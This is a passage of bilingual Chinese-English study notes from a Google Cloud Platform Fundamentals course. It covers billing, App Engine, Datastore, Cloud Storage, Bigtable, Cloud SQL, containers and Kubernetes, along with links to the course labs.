&lt;li&gt;Sub-hour billing  &lt;ul&gt;
&lt;li&gt;以分計費  &lt;/li&gt;
&lt;li&gt;不像 AWS 以小時計費，不滿一小時仍然以一小時計費  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sustained-use discounts  &lt;ul&gt;
&lt;li&gt;機器開超過一定的時間就會有折扣，採累進的折扣。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Compute Engine custom machine types  &lt;/li&gt;
&lt;li&gt;價錢比較便宜，但有夠難算 XDDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Commitment to Open APIs and Open Source&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;TensorFlow  &lt;/li&gt;
&lt;li&gt;Android  &lt;/li&gt;
&lt;li&gt;Go  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://kubernetes.io/"&gt;Kubernetes&lt;/a&gt; (k8s)  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;The Future of Cloud Computing&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;1st wave: Colocation  &lt;/li&gt;
&lt;li&gt;2nd wave: Virtualized Data Centers  &lt;/li&gt;
&lt;li&gt;3rd wave: A global, elastic cloud  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;IaaS and PaaS&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;IaaS: Compute Engine  &lt;ul&gt;
&lt;li&gt;Towards managed infrastructure (DevOps)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PaaS: App Engine  &lt;ul&gt;
&lt;li&gt;Towards managed services (NoOps)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Google Cloud Platform&lt;/h2&gt;
&lt;p&gt;&lt;img alt="Google Cloud Platform" src="/files/cp100a-google-cloud-platform-fundamentals/gcp.png" /&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Storage  &lt;ul&gt;
&lt;li&gt;BigTable  &lt;ul&gt;
&lt;li&gt;Fully Compatible with HBase  &lt;/li&gt;
&lt;li&gt;Google 版本的 HBase  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud SQL  &lt;ul&gt;
&lt;li&gt;最近出了 2.0 (2nd Generation)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Big Data  &lt;ul&gt;
&lt;li&gt;Pub/Sub  &lt;ul&gt;
&lt;li&gt;Distributed Message Queue like Kafka  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/dataflow/"&gt;Dataflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;a unified programming model and a managed service for developing and executing a wide range of data processing patterns including ETL, batch computation, and continuous computation.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/dataproc/"&gt;Dataproc&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Spark Cluster  &lt;/li&gt;
&lt;li&gt;an Apache Hadoop, Apache Spark, Apache Pig, and Apache Hive service, to easily process big datasets at low cost.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Datalab  &lt;ul&gt;
&lt;li&gt;基本上就是 Google Cloud 版本的 Jupyter Notebook (IPython Notebook)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Launcher&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;和 Bitnami 合作提供的服務  &lt;/li&gt;
&lt;li&gt;可以直接在上面直接 Create 設定好的 GCE instance  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 1&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cp100-free-trial/#0"&gt;Sign Up for the Free Trial and Create a Project&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/stackdriver/"&gt;Stackdriver&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;monitoring, logging, &amp;amp; diagnostics  &lt;/li&gt;
&lt;li&gt;可以整合 GCP 和 AWS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://console.cloud.google.com/launcher"&gt;Cloud Launcher&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/launcher/docs/#deploying_a_software_package"&gt;https://cloud.google.com/launcher/docs/#deploying_a_software_package&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;點下去可以直接幫你 create 安裝好該服務的 GCE instance，簡單來說就是已經預先做好 Image 然後直接幫你塞進去。  &lt;ul&gt;
&lt;li&gt;我原本以為是可以複選，然後一次幫你安裝剛剛選的那些服務到一台 GCE instance 上，但看來是比較提倡分散式就是了，當然這樣在 Production 上會比較好，不然一台 instance 炸了就所有服務都炸了 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;補充&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Project 的管理  &lt;ul&gt;
&lt;li&gt;Members 的 account 可以採用 gmail.com, apps for work 的 account, Google Groups 的 account, service account  &lt;/li&gt;
&lt;li&gt;一個帳號可以管理多個 project  &lt;/li&gt;
&lt;li&gt;管錢的和管 Project 的帳號可以分開設定  &lt;/li&gt;
&lt;li&gt;可以考慮多開不同的 Project，一來是 Quota 的限制比較不會那麼吃緊，二來是 Permission 的設定可以比較不需要那麼費心，如果全部的 Team 都擠在同個 Project 的話，Permission 的設定可能得多費心調整。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Billing  &lt;ul&gt;
&lt;li&gt;Sustain Pricing 在遇到 billing account change 的時候會重算，所以  &lt;/li&gt;
&lt;li&gt;可以設定 budget，超過的時候會通知，每個服務也都可以設限。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 2: Getting Started with Google Cloud Platform&lt;/h1&gt;
&lt;h2&gt;Cloud Computing&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Compute Engine --- Container Engine --- App Engine --- Cloud Endpoints  
IaaS ------------- Clusters -------- Managed VMs (beta) -------- PaaS  
Configurability DevOps &amp;lt;-----------------------------&amp;gt; Agility NoOps  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;IaaS  &lt;ul&gt;
&lt;li&gt;Compute Engine == AWS EC2 == Virtual Machine  &lt;ul&gt;
&lt;li&gt;Raw compute granular control  &lt;/li&gt;
&lt;li&gt;可以使用預先提供好的 Image，也可以自己建好 Image 再上傳來用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;PaaS  &lt;ul&gt;
&lt;li&gt;App Engine  &lt;ul&gt;
&lt;li&gt;最早出來的時候是只有 Python  &lt;/li&gt;
&lt;li&gt;有漲價過，當時一堆人離開  &lt;/li&gt;
&lt;li&gt;後來又有一些人回來用，支援 Java, Go, PHP, Python  &lt;/li&gt;
&lt;li&gt;最近 Beta 開始支援 Ruby  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud Endpoints  &lt;ul&gt;
&lt;li&gt;Preset run-times  &lt;/li&gt;
&lt;li&gt;Focus app logic  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SaaS  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://developers.google.com/apis-explorer/#p/"&gt;Google APIs Explorer&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;只要是 Google 的服務基本上都會有 API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 2&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cp100-cloud-launcher/#0"&gt;Getting Started with Google Cloud Platform&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 3: Google App Engine and Google Cloud Datastore&lt;/h1&gt;
&lt;h2&gt;Google App Engine&lt;/h2&gt;
&lt;h3&gt;What is Google App Engine&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Managed runtimes for specific versions of Java, Python, PHP and Go. (Standard Runtime)  &lt;/li&gt;
&lt;li&gt;Autoscale workloads to meet demand  &lt;ul&gt;
&lt;li&gt;可以透過 app.yaml 去做 autoscale 的設定  &lt;/li&gt;
&lt;li&gt;也可以透過 app.yaml 對 instance class 做設定，預設是用最低階的 F1，可以參考 &lt;a href="https://cloud.google.com/appengine/docs/python/config/appref#scaling_elements"&gt;app.yaml Reference|Python|Google Cloud Platform&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Free daily quota, usage based pricing  &lt;/li&gt;
&lt;li&gt;Local SDK for development, testing and deployment  &lt;/li&gt;
&lt;li&gt;Need to conform to sandbox constraints  &lt;ul&gt;
&lt;li&gt;No writing to the local filesystem  &lt;/li&gt;
&lt;li&gt;Request timeouts at 60 seconds  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;可以透過 version 來控管每個 service (原本叫 module，最近改叫 service 了）  &lt;/li&gt;
&lt;li&gt;可以透過 split traffic 做 A/B testing  &lt;/li&gt;
&lt;li&gt;有類似 rolling update 的機制  &lt;ul&gt;
&lt;li&gt;Deploy 新的 version 後，GAE 會自動幫你把舊版本的 instance 關掉，然後開新的版本的 instance  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可以讓開發者專注在發開程式，不用費心在建置環境的部份  &lt;/li&gt;
&lt;li&gt;實例：  &lt;ul&gt;
&lt;li&gt;Snapchat  &lt;ul&gt;
&lt;li&gt;用 App Engine  &lt;/li&gt;
&lt;li&gt;只花流量的費用，不存圖片，超省成本。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;App Engine Standard Environment&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Managed runtimes for specific versions of Java, Python, PHP, Go.  &lt;ul&gt;
&lt;li&gt;目前只支援 Python 2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Autoscale  &lt;/li&gt;
&lt;li&gt;Free daily quota, usage based pricing.  &lt;/li&gt;
&lt;li&gt;原本 support 一天發 2000 封 email，但現在收回來了，現在要在 GCP 上寄信的話，統一都要使用 &lt;a href="https://sendgrid.com/"&gt;SendGrid&lt;/a&gt;，會有比較嚴格的審核，避免大量的垃圾信件。  &lt;ul&gt;
&lt;li&gt;AWS 也採用 SendGrid，蠻多 Cloud Platform 都把寄信的部份交給它。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;跟 Google 的很多服務都有滿完整的整合。  &lt;/li&gt;
&lt;li&gt;GAE 的設計理念是服務要愈 light weight 愈好  &lt;/li&gt;
&lt;li&gt;GAE 的內建服務  &lt;ul&gt;
&lt;li&gt;Memcache  &lt;ul&gt;
&lt;li&gt;免費的會有 crash 的風險，不會幫你把 data 復原。  &lt;/li&gt;
&lt;li&gt;付費的會在 crash 的時候幫你把 data 復原。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Taskqueues  &lt;ul&gt;
&lt;li&gt;用來設計保證該 task 一定會被完成的架構  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scheduled tasks  &lt;ul&gt;
&lt;li&gt;cron.yaml  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Blobstore  &lt;/li&gt;
&lt;li&gt;Search  &lt;/li&gt;
&lt;li&gt;Logging  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;App Engine Flexible Environment (GAE Managed VM)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;用 container 來處理  &lt;/li&gt;
&lt;li&gt;沒有 sandbox 的限制  &lt;/li&gt;
&lt;li&gt;可以做到支援 Python 3  &lt;/li&gt;
&lt;li&gt;During beta pricing based on GCE  &lt;/li&gt;
&lt;li&gt;Local Development relies on Docker  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GAE Standard vs Flexible Environment 比較表&lt;/h3&gt;
&lt;p&gt;&lt;img alt="GAE Environments" src="/files/cp100a-google-cloud-platform-fundamentals/gae-environments.png" /&gt;  &lt;/p&gt;
&lt;h1&gt;Google Cloud Endpoints&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Build your own API running on App Engine Standard  &lt;/li&gt;
&lt;li&gt;Expose your API using a RESTful interface  &lt;/li&gt;
&lt;li&gt;Includes support for OAuth 2.0 authorization  &lt;/li&gt;
&lt;li&gt;Generate client libraries  &lt;/li&gt;
&lt;li&gt;Supports Java and Python server-side code  &lt;/li&gt;
&lt;li&gt;Includes App Engine features  &lt;ul&gt;
&lt;li&gt;Scaling  &lt;/li&gt;
&lt;li&gt;Denial of service protection  &lt;/li&gt;
&lt;li&gt;High availability  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Supports iOS, Android, and JavaScript  &lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;可以自動 generate client library  &lt;/li&gt;
&lt;li&gt;目前 support Java 跟 Python  &lt;/li&gt;
&lt;li&gt;直接 apply GAE 的一些 feature  &lt;/li&gt;
&lt;li&gt;HA  &lt;/li&gt;
&lt;li&gt;Support iOS, Android and JavaScript clients  &lt;/li&gt;
&lt;li&gt;但因為是在 GAE 上在堆疊一層，所以當量很大的時候，效能可能要注意一下  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Google Cloud Datastore&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Daily free quota  &lt;/li&gt;
&lt;li&gt;Database designed for application backends  &lt;/li&gt;
&lt;li&gt;NoSQL store for billions of rows  &lt;/li&gt;
&lt;li&gt;Schemaless access, no need to think about underlying data structure  &lt;/li&gt;
&lt;li&gt;Local development tools  &lt;/li&gt;
&lt;li&gt;Automatic scaling and fully managed  &lt;/li&gt;
&lt;li&gt;Built-in redundancy  &lt;/li&gt;
&lt;li&gt;Supports ACID transactions  &lt;/li&gt;
&lt;li&gt;RESTful API  &lt;/li&gt;
&lt;li&gt;Includes a free daily quota  &lt;/li&gt;
&lt;li&gt;Access from anywhere through a RESTful interface  &lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;有 autoscale 的能力，會對應 GAE 的數量來去調整  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 3&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cp100-app-engine/"&gt;Deploying Applications Using App Engine and Cloud Datastore&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/GoogleCloudPlatformTraining/cp100-bookshelf"&gt;https://github.com/GoogleCloudPlatformTraining/cp100-bookshelf&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 4: Google Cloud Platform Storage Options&lt;/h1&gt;
&lt;h2&gt;Google Cloud Storage&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Not a file system (but can be accessed as one via 3rd party tools such as GCS Fuse)  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/GoogleCloudPlatform/gcsfuse"&gt;https://github.com/GoogleCloudPlatform/gcsfuse&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;IO 不快  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Simple administration and does not require capacity management  &lt;/li&gt;
&lt;li&gt;All storage options accessed through the same APIs and include client libraries  &lt;ul&gt;
&lt;li&gt;JSON API  &lt;/li&gt;
&lt;li&gt;XML API  &lt;ul&gt;
&lt;li&gt;可能是因為 AWS S3 是用 XML API，所以也要跟著提供一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;硬碟上的資料是有做 encryption 的  &lt;/li&gt;
&lt;li&gt;容器是以 bucket 為單位  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Cloud Storage Classes&lt;/h3&gt;
&lt;p&gt;&lt;img alt="Cloud Storage Classes" src="/files/cp100a-google-cloud-platform-fundamentals/cloud-storage-classes.png" /&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Standard  &lt;/li&gt;
&lt;li&gt;DRA  &lt;ul&gt;
&lt;li&gt;可以限制資料的區域  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Nearline  &lt;ul&gt;
&lt;li&gt;經常變動的資料不適合存在這裡，cost 會增加。  &lt;/li&gt;
&lt;li&gt;比較適合拿來做 backup, archive, 長久性不太會變動的資料。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這 3 個 classes 存取的 API 是相同的  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Cloud Storage Features&lt;/h3&gt;
&lt;p&gt;&lt;img alt="Cloud Storage Features" src="/files/cp100a-google-cloud-platform-fundamentals/cloud-storage-features.png" /&gt;  &lt;/p&gt;
&lt;h3&gt;Cloud Storage Integration&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery  &lt;ul&gt;
&lt;li&gt;Import and export tables  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Compute Engine  &lt;ul&gt;
&lt;li&gt;Startup scripts, images and general object storage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;App Engine  &lt;ul&gt;
&lt;li&gt;Object storage, logs, Datastore backup  &lt;/li&gt;
&lt;li&gt;App Engine 本身不能存資料，但可以存在 Cloud Storage 和 Datastore  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cloud SQL  &lt;ul&gt;
&lt;li&gt;Import and export tables  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可以拿來直接 serve static websites.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Google Cloud Bigtable&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;NoSQL database service for large-workload applications (Terabytes to Petabytes)  &lt;ul&gt;
&lt;li&gt;不便宜  &lt;ul&gt;
&lt;li&gt;貴在 Node 執行時間的收費，目前是 $1.95 USD/hour per node  &lt;/li&gt;
&lt;li&gt;最少必須開 3 個 node  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;是儲存在 SSD 上  &lt;ul&gt;
&lt;li&gt;最近開始可以選擇儲存在普通硬碟上了，Storage 的費用會降低大概十倍。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Protected  &lt;ul&gt;
&lt;li&gt;Replicated storage  &lt;/li&gt;
&lt;li&gt;Data encryption in-flight and at rest  &lt;/li&gt;
&lt;li&gt;Role-based ACLs  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Proven  &lt;ul&gt;
&lt;li&gt;Gmail and Google Analytics  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;高 IO, 可在最短的時間內查到最多的資料  &lt;/li&gt;
&lt;li&gt;Gmail 和 Google Analytics 的背後也是用 Bigtable  &lt;/li&gt;
&lt;li&gt;很多做股票交易的也是用 Bigtable  &lt;/li&gt;
&lt;li&gt;很貴但反應快  &lt;/li&gt;
&lt;li&gt;主要是為了取代 HBase  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud SQL&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Google-managed MySQL  &lt;/li&gt;
&lt;li&gt;Pay-per-use model  &lt;/li&gt;
&lt;li&gt;REST API for management  &lt;/li&gt;
&lt;li&gt;Affordability and performance  &lt;ul&gt;
&lt;li&gt;有 class 可以選擇，視需求可以調整  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google security  &lt;/li&gt;
&lt;li&gt;Vertical scaling (read and write)  &lt;/li&gt;
&lt;li&gt;Horizontal scaling (read)  &lt;/li&gt;
&lt;li&gt;Seamless integratin with GAE and GCE  &lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;第一代的 performance 不是那麼好  &lt;/li&gt;
&lt;li&gt;第二代則是選擇 run 在 container 上  &lt;/li&gt;
&lt;li&gt;所有要連線來的 IP 都需要經過 white list  &lt;ul&gt;
&lt;li&gt;有個例外是 App Engine，可以直接連線，不會被白名單限制。  &lt;/li&gt;
&lt;li&gt;可以設定讓 Cloud SQL 綁定 GAE，讓它開在跟 GAE 同個 region，用來降低 Latency  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;七天一個 cycle 的 backup  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Cloud SQL Features&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Familiar with MySQL  &lt;/li&gt;
&lt;li&gt;Flexible pricing  &lt;/li&gt;
&lt;li&gt;Google Security  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/sql/faq#encryption_manage"&gt;AES-128 encryption&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Managed backups  &lt;/li&gt;
&lt;li&gt;Automatic replication  &lt;ul&gt;
&lt;li&gt;master-slave  &lt;/li&gt;
&lt;li&gt;自動化 replication  &lt;/li&gt;
&lt;li&gt;一個 instance 掛掉的話，會有 downtime 但會再開另外一個 instance 去接替，有基本的 HA 功能。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援 SSL 的 connection  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Cloud SQL Second Generation&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Same features as first generation with higher performance, storage capacity at lower cost.  &lt;ul&gt;
&lt;li&gt;Up to 7X throughput and 20X sotrage capacity of first generation instances  &lt;/li&gt;
&lt;li&gt;Less expensive than first generation for most use cases.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;如果想要開比較小的 DB 的話可以考慮用 2nd generation，性價比會比較高。  &lt;/li&gt;
&lt;li&gt;如果是要用很大的 DB 的話，建議用 1st generation 讓 Google 幫忙管理會比較好。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Comparing Storage Options&lt;/h3&gt;
&lt;p&gt;&lt;img alt="Comparing Storage Options" src="/files/cp100a-google-cloud-platform-fundamentals/comparing-storage-options.png" /&gt;  &lt;/p&gt;
&lt;h2&gt;Lab 4&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cp100-cloud-storage/"&gt;Integrating Applications with Google Cloud Storage&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 5: Google Container Engine (GKE)&lt;/h1&gt;
&lt;h2&gt;What is a Container&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Virtualization at the operating system layer  &lt;/li&gt;
&lt;li&gt;Separates operating system from application code and dependencies  &lt;/li&gt;
&lt;li&gt;Isolates individual processes  &lt;/li&gt;
&lt;li&gt;Popular implementations include Docker and &lt;a href="https://coreos.com/rkt/docs/latest/"&gt;rkt&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;k8s 目前支援這兩種格式的 Container  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OS =&amp;gt; Shared Libraries =&amp;gt; Contianer  &lt;ul&gt;
&lt;li&gt;安全性問題  &lt;ul&gt;
&lt;li&gt;會不會影響到別的 Container  &lt;/li&gt;
&lt;li&gt;把 kernel 弄爛了的話，別的 Container 也會一起爛掉。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Why Use Container?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Support consistency across development, testing, and production environments  &lt;/li&gt;
&lt;li&gt;Loose coupling between application and operating system layers  &lt;/li&gt;
&lt;li&gt;Much simpler to migrate workloads between on premises and cloud environments  &lt;/li&gt;
&lt;li&gt;Support agile development and operations  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a href="http://kubernetes.io/"&gt;Kubernetes (k8s)&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Open Source  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/kubernetes"&gt;https://github.com/kubernetes/kubernetes&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google 的服務是跑在 &lt;a href="http://blog.kubernetes.io/2015/04/borg-predecessor-to-kubernetes.html"&gt;Borg&lt;/a&gt; 上面，Borg 是 k8s 的前身。  &lt;/li&gt;
&lt;li&gt;另外一個 Container 是 &lt;a href="https://dcos.io/"&gt;dcos&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/dcos/dcos"&gt;https://github.com/dcos/dcos&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Features of k8s&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Workload portability  &lt;ul&gt;
&lt;li&gt;Run in many environments, across cloud providers  &lt;/li&gt;
&lt;li&gt;Implementation is open and modular  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rolling updates  &lt;ul&gt;
&lt;li&gt;Upgrade application with zero downtime  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Autoscaling  &lt;ul&gt;
&lt;li&gt;Automatically adapt to changes in workload  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Persistent storage  &lt;ul&gt;
&lt;li&gt;Abstracts details of how storage is provided from how it is consumed  &lt;/li&gt;
&lt;li&gt;有支援 MySQL Cluster  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Multi-zone clusters  &lt;ul&gt;
&lt;li&gt;Run a single cluster in multiple zones  &lt;/li&gt;
&lt;li&gt;Alpha on Google Cloud Platform  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Load balancing  &lt;ul&gt;
&lt;li&gt;External IP address routes traffic to correct port  &lt;/li&gt;
&lt;li&gt;Google 會幫你偵測機器的狀態，在機器死掉的時候幫你做 Migration  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Google Cloud Container Engine (GKE)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Based on open source Kubernetes(k8s) orchestration system  &lt;/li&gt;
&lt;li&gt;Orchestrate and schedule Docker containers  &lt;/li&gt;
&lt;li&gt;Consumes Compute Engine instances and resources  &lt;/li&gt;
&lt;li&gt;Uses a declarative syntax to manage applications  &lt;ul&gt;
&lt;li&gt;JSON, YAML  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Decouple operational and development concerns  &lt;/li&gt;
&lt;li&gt;Manages and maintains  &lt;ul&gt;
&lt;li&gt;Logging  &lt;/li&gt;
&lt;li&gt;Health management  &lt;/li&gt;
&lt;li&gt;Monitoring  &lt;/li&gt;
&lt;li&gt;Scaling  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;補充  &lt;ul&gt;
&lt;li&gt;不只在 GCP 可以用，AWS 或是自己架都可以，因為是 Based on Open Source 的 k8s  &lt;/li&gt;
&lt;li&gt;可以執行很多 Container，彼此可以透過 k8s 達到 HA  &lt;/li&gt;
&lt;li&gt;目前的費用是算在 Compute Engine 上，因為實際還是開 GCE 然後在上面 run containers  &lt;/li&gt;
&lt;li&gt;目前以 GCE 的收費方式計價  &lt;/li&gt;
&lt;li&gt;Google Cloud Container Builder  &lt;ul&gt;
